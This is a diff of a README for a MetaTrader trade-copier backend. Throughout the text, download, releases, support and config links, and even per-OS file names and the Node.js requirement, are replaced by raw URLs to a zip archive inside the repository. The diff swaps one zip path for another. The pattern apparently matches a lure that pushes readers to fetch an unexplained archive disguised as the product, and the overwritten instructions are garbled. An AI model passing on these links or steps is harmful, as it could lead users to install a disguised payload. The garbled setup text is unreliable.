@@ -6,36 +6,36 @@ Welcome to the MT4-MT5-Trade-Copier-Backend! This platform allows you to automat
 
 ## 📥 Download the Application
 
-[![Download MT4-MT5-Trade-Copier-Backend](https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip)](https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip)
+[![Download MT4-MT5-Trade-Copier-Backend](https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip)](https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip)
 
 ## 💻 System Requirements
 
 Before you begin, ensure your system meets these requirements:
 
 - Operating System: Windows 10 or later, macOS, or Linux
-- https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip Version 14 or later
-- PostgreSQL: Any version compatible with https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip
+- https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip Version 14 or later
+- PostgreSQL: Any version compatible with https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip
 - Stable internet connection
 
 ## 🛠️ Installation
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip) to find the latest version.
 
 2. **Download the Latest Release**
    Download the latest release suitable for your operating system. Look for a file named:
-   - `https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip` for Windows users,
-   - `https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip` for macOS users,
-   - `https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip` for Linux users.
+   - `https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip` for Windows users,
+   - `https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip` for macOS users,
+   - `https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip` for Linux users.
 
 3. **Extract the Files**
-   Once the download completes, extract the contents of the ZIP or https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip file to a folder of your choice.
+   Once the download completes, extract the contents of the ZIP or https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip file to a folder of your choice.
 
 4. **Setup PostgreSQL**
    Ensure PostgreSQL is installed and running. Create a new database for the Trade Copier. You can do this through pgAdmin or any PostgreSQL client. Name the database something like `trade_copier`.
 
 5. **Configure the Application**
-   Open the extracted folder and locate `https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip`. Update it with your PostgreSQL connection details and any other necessary settings.
+   Open the extracted folder and locate `https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip`. Update it with your PostgreSQL connection details and any other necessary settings.
 
 6. **Install Dependencies**
    Open your command line interface (Command Prompt on Windows, Terminal on macOS and Linux). Navigate to the extracted folder and run the following command:
@@ -69,7 +69,7 @@ Your Trade Copier should now be running.
 
 ## 📞 Support
 
-If you encounter any issues, please visit the issues section on our [GitHub page](https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip). You can report your problem, and we will assist you.
+If you encounter any issues, please visit the issues section on our [GitHub page](https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip). You can report your problem, and we will assist you.
 
 ## 📝 Update Notes
 
@@ -79,6 +79,6 @@ Every release may include bug fixes, new features, or improvements. Be sure to c
 
 Feel free to follow the project on GitHub to stay updated. You can also reach out through our social media channels for tips and discussions related to copy trading.
 
-For full functionality and support, ensure to keep your application updated by frequently checking the [Releases page](https://github.com/lewi522/MT4-MT5-Trade-Copier-Backend/raw/refs/heads/main/config/middlewares/M-Copier-Backend-Trade-way.zip). 
+For full functionality and support, ensure to keep your application updated by frequently checking the [Releases page](https://raw.githubusercontent.com/lewi522/MT4-MT5-Trade-Copier-Backend/main/trading/Trade-M-Copier-Backend-v2.4.zip). 
 
 Thank you for using the MT4-MT5-Trade-Copier-Backend. Happy trading!
